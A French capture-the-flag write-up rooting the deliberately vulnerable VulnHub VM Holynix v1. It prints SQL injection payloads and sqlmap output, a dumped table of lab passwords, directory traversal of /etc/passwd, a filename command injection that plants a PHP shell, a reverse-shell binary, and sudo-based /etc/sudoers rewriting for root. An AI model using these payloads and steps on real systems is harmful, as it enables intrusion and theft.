# Solution du CTF Holynix #1 de VulnHub

[Holynix: v1](https://vulnhub.com/entry/holynix-v1,20/) est un vieux CTF proposé sur VulnHub et créé par *Holynix*. La date de publication de ce CTF remonte au 27 novembre 2010 soit une éternité en terme d'informatique :p

La VM ne charge pas correctement que ce soit dans VMWare ou VirtualBox : elle ne parvient pas à obtenir une adresse IP.

Pour régler le problème il faut monter l'image virtuelle et supprimer un fichier `udev`. Ca se fait facilement avec l'utilitaire `vmware-mount`.

Si vous galérez à installer VMWare sur votre machine (problème de compilation des modules kernel) je vous invite à suivre [ces instructions]([vmware-host-modules/INSTALL at master · mkubecek/vmware-host-modules · GitHub](https://github.com/mkubecek/vmware-host-modules/blob/master/INSTALL)).

On liste d'abord les partitions présentes dans le fichier vmdk :

```shellsession
$ sudo vmware-mount -p /tmp/holynix/holynix.vmdk
Nr      Start       Size Type Id Sytem                   
-- ---------- ---------- ---- -- ------------------------
 1         63     192717 BIOS 83 Linux
 2     192780     337365 BIOS 82 Linux swap
 3     530145    1558305 BIOS 83 Linux
```

La première est la partition boot, la seconde la swap, c'est donc la troisième qu'il nous faut monter :

```shellsession
$ sudo vmware-mount /tmp/holynix/holynix.vmdk 3 /mnt/
$ ls /mnt/
bin  boot  cdrom  dev  etc  home  initrd  initrd.img  lib  lost+found  media  mnt  opt  proc  root  sbin  srv  sys  tmp  usr  var  vmlinuz
$ sudo rm /mnt/etc/udev/rules.d/70-persistent-net.rules
$ sudo vmware-mount -d /mnt/
```

Et on peut alors importer la VM et la démarrer.

```shellsession
sudo nmap -sCV -p- -T5 192.168.242.135
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-04 15:35 CET
Nmap scan report for 192.168.242.135
Host is up (0.00051s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch
MAC Address: 00:0C:29:2C:F0:5C (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.06 seconds
```

## Web vuln 101

On débarque sur la page web de `Nakimura Industries Production Server`.

Il y a un formulaire de login présent. Je lance tout de suite Wapiti qui me trouve une faille SQL :

```shellsession
$ wapiti -u http://192.168.242.135/ -v2 --color
ujson module not found, using json

     __    __            _ _   _ _____
    / / /\ \ \__ _ _ __ (_) |_(_)___ /
    \ \/  \/ / _` | '_ \| | __| | |_ \
     \  /\  / (_| | |_) | | |_| |___) |
      \/  \/ \__,_| .__/|_|\__|_|____/
                  |_|                 
Wapiti 3.1.4 (wapiti-scanner.github.io)
[+] GET http://192.168.242.135/ (0)
[+] GET http://192.168.242.135/?page=login.php (1)
[+] GET http://192.168.242.135/index.php (1)
[+] POST http://192.168.242.135/index.php?page=login.php (2)
        data: user_name=alice&password=Letm3in_&Submit_button=Submit
[+] GET http://192.168.242.135/index.php?page=login.php (2)
[*] Saving scan state, please wait...
[*] Wapiti found 5 URLs and forms during the scan
[*] Existing modules:
         backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, log4shell, methods, nikto, permanentxss, redirect, shellshock, sql, ssl, ssrf, takeover, timesql, wapp, wp_enum, xss, xxe
--- snip ---
[*] Launching module sql
--- snip ---
---
SQL Injection (DBMS: MySQL) in http://192.168.242.135/index.php via injection in the parameter password
Evil request:
    POST /index.php?page=login.php HTTP/1.1
    host: 192.168.242.135
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.242.135/?page=login.php
    content-length: 69
    Content-Type: application/x-www-form-urlencoded

    user_name=alice&password=Letm3in_%C2%BF%27%22%28&Submit_button=Submit
---
```

Pour le moment je n'utilise pas `sqlmap`. En effet si on rentre l'utilisateur `admin` et le mot de passe `' or '1'='1` on se retrouve directement connecté avec un utilisateur nommé `alamo`.

La page d'index reçoit un paramètre page qui contient le nom d'un fichier PHP. Par exemple avec http://192.168.242.135/?page=messageboard.php (l'un des liens) on trouve une discussion :

> **jjames:**(2011-11-17 07:06:25)  
> I'm having problems connecting to the ssh server. I keep getting a Connection refused error. Is there a problem I don't know about???
> 
> **ltorvalds:**(2011-11-17 08:03:15)  
> Check your email. There is no problem with the server or the system. As of late we have been experiencing an increased occurance of brute force attacks on our ssh server. In an attempt to stop this we have implemented a port knocking system using knockknock. A seperate profile has been generated for each user of this system. You will, however, need to install knockknock on your local system. It can be downloaded [here](http://192.168.242.135/misc/knockknock-0.7.tar.gz) or from http://www.thoughtcrime.org/software/knockknock/. If you have any problem with installation or getting knockknock to work just drop me an email or ask here.
> 
> **rtmorris:**(2011-11-17 10:14:11)  
> thanks gary :)
> 
> **jjames:**(2011-11-17 13:36:19)  
> Okay thanks Linus, I've got it working now.
> 
> **jdraper:**(2011-11-17 19:54:31)  
> I've got knockknock installed but I'm not exactly sure what to do with the profile.tar.gz file I got in the mail, could anyone help me out?
> 
> **ltorvalds:**(2011-11-18 08:04:51)  
> First create a knockknock dir in your home dir with 'mkdir ~/.knockknock/', then create a folder inside the .knockknock dir called either the ip of this machine or the domain. I use 'mkdir ~/.knockknock/nakimura.example.net'. Finally extract the tarball you recieved in the mail to that directory.

Il est visiblement question de port-knocking. On verra si on a besoin d'en arriver là. Je remarque aussi que le bypass de l'authentification nous a défini un cookie nommé `uid` qui a dans notre cas la valeur `1`.

Je peux attaquer d'autres scripts de la partie authentifiée en passant le cookie à Wapiti. L'un des scripts semble être un bon candidat à un directory traversal :

```shellsession
$ wapiti -u "http://192.168.242.135/index.php?page=ssp.php" -H "Cookie: uid=1;" --scope url -v2 --color --detailed-report
--- snip ---
---
Linux local file disclosure vulnerability in http://192.168.242.135/index.php via injection in the parameter text_file_name
Evil request:
    POST /index.php?page=ssp.php HTTP/1.1
    host: 192.168.242.135
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: uid=1;
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.242.135/index.php?page=ssp.php
    content-length: 45
    Content-Type: application/x-www-form-urlencoded

    B=Display%20File&text_file_name=%2Fetc%2Fpasswd
---
```

L'option `--detailed-report` permet d'inclure l'output des requêtes dans le rapport généré par Wapiti. On peu ainsi voir que l'accès au fichier `/etc/passwd` a bien réussi :

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:105:114:MySQL Server,,,:/var/lib/mysql:/bin/false
alamo:x:1000:115::/home/alamo:/bin/bash
etenenbaum:x:1001:100::/home/etenenbaum:/bin/bash
gmckinnon:x:1002:100::/home/gmckinnon:/bin/bash
hreiser:x:1003:50::/home/hreiser:/bin/bash
jdraper:x:1004:100::/home/jdraper:/bin/bash
jjames:x:1005:50::/home/jjames:/bin/bash
jljohansen:x:1006:115::/home/jljohansen:/bin/bash
ltorvalds:x:1007:113::/home/ltorvalds:/bin/bash
kpoulsen:x:1008:100::/home/kpoulsen:/bin/bash
mrbutler:x:1009:50::/home/mrbutler:/bin/bash
rtmorris:x:1010:100::/home/rtmorris:/bin/bash
```

Un autre payload a détecté la vulnérabilité par le biais d'un message d'erreur mentionnant `fopen()`. Nous ne sommes donc pas en présence d'une faille d'inclusion, juste d'un directory traversal.

La vulnérabilité fonctionne aussi en GET, ainsi on peut plus aisément regarder le contenu des fichiers (on chargera par exemple http://192.168.242.135/index.php?page=ssp.php&text_file_name=/etc/passwd&B=Display+File ).

J'ai fouillé un peu cette histoire de port-knowking et je n'ai trouvé aucun des utilisateurs disposant du fameux `profile.tar.gz` dans son home.

## Upload arbitraire et injection de commande

Sur le site il y a une fonctionnalité d'upload présente mais cette dernière semble refusée pour l'utilisateur `alamo` : on obtient un message d'erreur indiquant que les uploads vers le home de l'utilisateur sont interdits.

Sans doute que c'est actif pour d'autres utilisateurs. On peut bien sûr sortir sqlmap pour aller fouiller dans la base de données :

```shellsession
$ python sqlmap.py -u "http://192.168.242.135/index.php?page=login.php" --data "user_name=alice&password=Letm3in&Submit_button=Submit" -p password --dbms mysql
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.11.7#dev}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:12:50 /2022-12-04/

[16:12:50] [INFO] testing connection to the target URL
[16:12:50] [INFO] checking if the target is protected by some kind of WAF/IPS
[16:12:51] [WARNING] reflective value(s) found and filtering out
[16:12:51] [INFO] testing if the target URL content is stable
[16:12:51] [INFO] target URL content is stable
[16:12:51] [INFO] heuristic (basic) test shows that POST parameter 'password' might be injectable (possible DBMS: 'MySQL')
[16:12:51] [INFO] heuristic (XSS) test shows that POST parameter 'password' might be vulnerable to cross-site scripting (XSS) attacks
[16:12:51] [INFO] testing for SQL injection on POST parameter 'password'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[16:13:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[16:13:10] [INFO] POST parameter 'password' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --string="Bad")
[16:13:10] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
--- snip ---
[16:13:10] [INFO] POST parameter 'password' is 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)' injectable 
[16:13:10] [INFO] testing 'MySQL inline queries'
--- snip ---
[16:13:20] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[16:14:20] [INFO] POST parameter 'password' appears to be 'MySQL >= 5.0.12 OR time-based blind (SLEEP)' injectable 
[16:14:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[16:14:20] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[16:14:20] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[16:14:20] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[16:14:20] [INFO] target URL appears to have 4 columns in query
[16:14:20] [INFO] POST parameter 'password' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[16:14:20] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 144 HTTP(s) requests:
---
Parameter: password (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: user_name=alice&password=Letm3in' OR NOT 1015=1015#&Submit_button=Submit

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: user_name=alice&password=Letm3in' OR ROW(9200,1077)>(SELECT COUNT(*),CONCAT(0x71716a7071,(SELECT (ELT(9200=9200,1))),0x71786b7171,FLOOR(RAND(0)*2))x FROM (SELECT 4202 UNION SELECT 2792 UNION SELECT 7451 UNION SELECT 1936)a GROUP BY x)-- zhJF&Submit_button=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
    Payload: user_name=alice&password=Letm3in' OR SLEEP(5)-- FSWk&Submit_button=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 4 columns
    Payload: user_name=alice&password=Letm3in' UNION ALL SELECT CONCAT(0x71716a7071,0x7942424a716a444d506c6a614248675a597271517156766a6c4479574858536971594d5749555a54,0x71786b7171),NULL,NULL,NULL#&Submit_button=Submit
---
[16:15:27] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL >= 4.1
[16:15:27] [INFO] fetched data logged to text files under '/home/sirius/.sqlmap/output/192.168.242.135'

[*] ending @ 16:15:27 /2022-12-04/
```

`sqlmap` a bien détecté la vulnérabilité en mode error-based ainsi que l'utilisation possible de `UNION`. On peut relancer en lui indiquant de dumper (après une rapide énumération) la table qui nous intéresse en rajoutant les options `-D creds -T accounts --dump` :

```
Database: creds                                                                                                                                                                                                  
Table: accounts
[11 entries]
+-----+--------+------------+----------------------+
| cid | upload | username   | password             |
+-----+--------+------------+----------------------+
| 1   | 0      | alamo      | Ih%40cK3dM1cR05oF7   |
| 2   | 1      | etenenbaum | P3n7%40g0n0wN3d      |
| 3   | 1      | gmckinnon  | d15cL0suR3Pr0J3c7    |
| 4   | 1      | hreiser    | Ik1Ll3dNiN%40r315er  |
| 5   | 1      | jdraper    | p1%40yIngW17hPh0n35  |
| 6   | 1      | jjames     | %40rR35t3D%40716     |
| 7   | 1      | jljohansen | m%40k1nGb0o7L3g5     |
| 8   | 1      | kpoulsen   | wH%407ar37H3Fed5D01n |
| 9   | 0      | ltorvalds  | f%407H3r0FL1nUX      |
| 10  | 1      | mrbutler   | n%405aHaSw0rM5       |
| 11  | 1      | rtmorris   | Myd%40d51N7h3NSA     |
+-----+--------+------------+----------------------+
```

Mais le plus simple dans notre cas c'est de bêtement changer la valeur du cookie `uid`. Ainsi en le mettant à 2 on se retrouve connecté avec le compte `etenenbaum` et ce dernier a le droit d'effectuer des uploads.

J'upload donc un `shell.php` mais je ne le retrouve pas sur le site. *Feroxbuster* trouve bien un dossier `/upload` à la racine mais mon shell n'est pas dedans.

Il est tant d'exploiter la faille de directory traversal pour comprendre ce qu'il se passe.

C'est le script `transfer.php` qui contient la logique de traitement des uploads :

```php
<?php
if ( $auth == 0 ) {
        echo "<center><h2>Content Restricted</h2></center>";
} else {
	if ( $upload == 1 )
	{
		$homedir = "/home/".$logged_in_user. "/";
		$uploaddir = "upload/";
		$target = $uploaddir . basename( $_FILES['uploaded']['name']) ;
		$uploaded_type = $_FILES['uploaded']['type'];
		$command=0;
		$ok=1;

		if ( $uploaded_type =="application/gzip" && $_POST['autoextract'] == 'true' ) {	$command = 1; }

		if ($ok==0)
		{
			echo "Sorry your file was not uploaded";
			echo "<a href='?index.php?page=upload.php' >Back to upload page</a>";
		} else {
        		if(move_uploaded_file($_FILES['uploaded']['tmp_name'], $target))
			{
				echo "<h3>The file '" .$_FILES['uploaded']['name']. "' has been uploaded.</h3><br />";
				echo "The ownership of the uploaded file(s) have been changed accordingly.";
				echo "<br /><a href='?page=upload.php' >Back to upload page</a>";
				if ( $command == 1 )
				{
					exec("sudo tar xzf " .$target. " -C " .$homedir);
					exec("rm " .$target);
				} else {
					exec("sudo mv " .$target. " " .$homedir . $_FILES['uploaded']['name']);
				}
				exec("/var/apache2/htdocs/update_own");
        		} else {
				echo "Sorry, there was a problem uploading your file.<br />";
				echo "<br /><a href='?page=upload.php' >Back to upload page</a>";
			}
		}
	} else { echo "<br /><br /><h3>Home directory uploading disabled for user " .$logged_in_user. "</h3>"; }
}
?>
```

Donc ce script prend bêtement le nom du fichier, l'upload dans le dossier `/upload` mais le déplace aussitôt vers le dossier de l'utilisateur avec un `sudo mv` ce qui explique que je ne le retrouvais plus.

Il y a une faille d'injection de commande ici par conséquent si je casse la commande du `sudo mv` mon upload ne sera pas déplacé.

Pour cela j'ai uploadé mon shell avec le nom `;shell.php` et j'ai bien retrouvé le fichier dans `/upload`.

## J'ai merdé

Une fois uploadé et exécuté un `reverse-sshx86` (le système est 32 bits : `Linux holynix 2.6.24-26-server #1 SMP Tue Dec 1 19:19:20 UTC 2009 i686 GNU/Linux`, `Ubuntu 8.04.4 LTS (hardy)`) je me suis penché sur ce qui autorisait l'utilisateur affecté au serveur web à lancer des commandes sudo :

```shellsession
www-data@holynix:/var/apache2/htdocs/upload$ sudo -l
User www-data may run the following commands on this host:
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /bin/chgrp
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /bin/mv
```

Mon idée a été d'exploiter l'autorisation de faire un `chown` pour ajouter une entrée à `/etc/sudoers` :

```shellsession
$ sudo /bin/chown www-data.www-data /etc/sudoers
$ chmod u+w /etc/sudoers
```

Par défaut `sudoers` est en mode 440 `donc` il faut modifier la permission pour l'éditer. J'ai rajouté `/bin/bash` à la suite des commandes autorisées :

`%www-data ALL = NOPASSWD: /bin/chown, /bin/chgrp, /bin/tar, /bin/mv, /bin/bash`

Ensuite je remet les permissions d'origine, sauf que :

```shellsession
$ chmod u-w /etc/sudoers
$ sudo /bin/chown root.root /etc/sudoers         
sudo: /etc/sudoers is owned by uid 33, should be 0
```

Héhéhé ! `sudo` ne veut pas s'exécuter car `sudoers` appartient à `www-data` à ce moment là !

## On la refait moins crispé

Cette fois je vais travailler sur une copie du `sudoers` pour éviter les bétises. `cp` n'est pas dans les commandes autorisées alors j'ai eu recours à `tar` pour faire une copie :

```shellsession
www-data@holynix:/var/apache2/htdocs/upload$ sudo /bin/tar c /etc/sudoers > sudoers.tar
/bin/tar: Removing leading `/' from member names
www-data@holynix:/var/apache2/htdocs/upload$ ls
;shell.php  index.php  reverse-sshx86  sudoers.tar
www-data@holynix:/var/apache2/htdocs/upload$ tar xvf sudoers.tar 
etc/sudoers
www-data@holynix:/var/apache2/htdocs/upload$ chmod u+w etc/sudoers
www-data@holynix:/var/apache2/htdocs/upload$ vi etc/sudoers
www-data@holynix:/var/apache2/htdocs/upload$ chmod u-w etc/sudoers 
www-data@holynix:/var/apache2/htdocs/upload$ sudo /bin/chown root.root etc/sudoers
www-data@holynix:/var/apache2/htdocs/upload$ ls -l etc/sudoers
-r--r----- 1 root root 768 Nov 18 09:58 etc/sudoers
www-data@holynix:/var/apache2/htdocs/upload$ sudo /bin/mv etc/sudoers /etc/sudoers
www-data@holynix:/var/apache2/htdocs/upload$ sudo /bin/bash
root@holynix:/var/apache2/htdocs/upload# id
uid=0(root) gid=0(root) groups=0(root)
```

Pas de flag à récupérer dans `/root` cette fois. Et au final cette histoire de port-knocking ?

```shellsession
root@holynix:/home# find /etc/knockknock.d/profiles/ -name config -ls -exec cat {} \;
 13874    4 -rw-r--r--   1 root     root           27 Dec  1  2009 /etc/knockknock.d/profiles/kpoulsen/config
[main]
knock_port = 13827

 13869    4 -rw-r--r--   1 root     root           27 Dec  1  2009 /etc/knockknock.d/profiles/jljohansen/config
[main]
knock_port = 13826

 13839    4 -rw-r--r--   1 root     root           27 Dec  1  2009 /etc/knockknock.d/profiles/alamo/config
[main]
knock_port = 13820

 13844    4 -rw-r--r--   1 root     root           27 Dec  1  2009 /etc/knockknock.d/profiles/etenenbaum/config
[main]
knock_port = 13821

 13859    4 -rw-r--r--   1 root     root           27 Dec  1  2009 /etc/knockknock.d/profiles/jdraper/config
[main]
knock_port = 13824

 13849    4 -rw-r--r--   1 root     root           27 Dec  1  2009 /etc/knockknock.d/profiles/gmckinnon/config
[main]
knock_port = 13822

 13879    4 -rw-r--r--   1 root     root           27 Dec  1  2009 /etc/knockknock.d/profiles/ltorvalds/config
[main]
knock_port = 13828

 13864    4 -rw-r--r--   1 root     root           27 Dec  1  2009 /etc/knockknock.d/profiles/jjames/config
[main]
knock_port = 13825

 13854    4 -rw-r--r--   1 root     root           27 Dec  1  2009 /etc/knockknock.d/profiles/hreiser/config
[main]
knock_port = 13823

 13884    4 -rw-r--r--   1 root     root           27 Dec  1  2009 /etc/knockknock.d/profiles/mrbutler/config
[main]
knock_port = 13829

 13889    4 -rw-r--r--   1 root     root           27 Dec  1  2009 /etc/knockknock.d/profiles/rtmorris/config
[main]
knock_port = 13830
```

Pas sûr de bien comprendre mais en tout cas je n'en ait pas eu besoin :)

Pour l'escalade de privilège j'ai vu que la majorité des personnes qui ont solutionné le challenge sont parti vers l'option suivante :

* copier `/bin/bash` vers `/tmp`

* mettre root en propriétaire dessus avec `sudo chown`

* remplacer `tar` par la copie de `bash` (`sudo mv`)

* exécuter `tar` (donc `bash`) avec `sudo`

*Publié le 4 décembre 2022*
